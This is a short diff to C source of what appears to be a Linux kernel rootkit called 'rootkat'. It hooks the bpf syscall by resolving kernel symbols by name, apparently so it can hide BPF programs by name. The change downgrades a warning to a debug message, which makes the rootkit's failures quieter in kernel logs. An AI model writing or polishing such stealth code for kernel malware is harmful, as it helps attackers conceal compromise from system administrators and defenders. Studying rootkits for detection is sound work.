@@ -101,7 +101,7 @@ int rootkat_hook_sys_bpf_install(void)
 	bpf_prog_by_id_p = (void *)rootkat_lookup_name("bpf_prog_by_id");
 	bpf_prog_put_p   = (void *)rootkat_lookup_name("bpf_prog_put");
 	if (!bpf_prog_by_id_p || !bpf_prog_put_p) {
-		pr_warn(TAG "bpf_prog_by_id/put unavailable; hide-by-name disabled\n");
+		pr_debug(TAG "bpf_prog_by_id/put unavailable; hide-by-name disabled\n");
 		return -ENOENT;
 	}
 	return rootkat_hook_install(&hook_sys_bpf);
